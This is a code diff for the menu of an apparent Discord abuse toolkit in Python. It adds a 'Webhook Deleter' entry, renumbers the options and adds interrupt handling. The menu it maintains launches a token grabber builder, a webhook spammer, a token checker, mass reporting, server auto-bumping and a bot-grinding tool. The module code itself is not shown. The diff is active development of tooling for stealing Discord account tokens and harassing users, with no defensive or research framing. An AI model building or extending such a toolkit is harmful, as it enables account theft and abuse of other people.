@@ -10,7 +10,7 @@ import os
 
 print(LICNECE)
 
-time.sleep(3)
+time.sleep(1)
 os.system('cls' if os.name == 'nt' else 'clear')
 
 try:
@@ -46,14 +46,15 @@ class Client:
             "2" : {"function" : spammer.spammer, "name" : "WebhookSpammer"},
             "3" : {"function" : checkers.token, "name" : "TokenChecker"},
             "4" : {"function" : checkers.webhook, "name" : "WebhookChecker"},
-            "5" : {"function" : historyClear.clear, "name" : "HistoryClear"},
-            "6" : {"function" : bumper.bumper, "name" : "AutoBump"},
-            "7" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
-            "8" : {"function" : memer.start, "name" : "Dank memer grinder"},
-            "9" : {"function" : serverLookup.fetch_data, "name" : "Server Lookup"},
-            "10" : {"function" : massReport.start, "name" : "Mass Report"},
-            "11" : {"function" : credits.show_credits, "name" : "Credits"},
-            "12" : {"function" : exit, "name" : "Exit"}
+            "5" : {"function" : checkers.webhook_deleter, "name" : "Webhook Deleter"},
+            "6" : {"function" : historyClear.clear, "name" : "HistoryClear"},
+            "7" : {"function" : bumper.bumper, "name" : "AutoBump"},
+            "8" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
+            "9" : {"function" : memer.start, "name" : "Dank memer grinder"},
+            "10" : {"function" : serverLookup.fetch_data, "name" : "Server Lookup"},
+            "11" : {"function" : massReport.start, "name" : "Mass Report"},
+            "12" : {"function" : credits.show_credits, "name" : "Credits"},
+            "13" : {"function" : exit, "name" : "Exit"}
         }
         self.modules = modules
 
@@ -80,17 +81,20 @@ class Client:
             )
             indx += 1
 
-
         if indx % 2 == 1:
             print("")
 
         option = input(f"\n {r2}[{b}?{r2}] Option: ")
 
         data = self.modules[option]
-
-        data["function"]()
-
-        input(f"\n {r2}[{b}!{r2}] Done! Press enter to continue")
+        
+        try:
+            data["function"]()
+        except KeyboardInterrupt:
+            input(f"\n {r2}[{b}!{r2}] Keyboard interupt")
+        else:
+            input(f"\n {r2}[{b}!{r2}] Done! Press enter to continue")
+        
         self.main()
 
 if __name__ == '__main__':
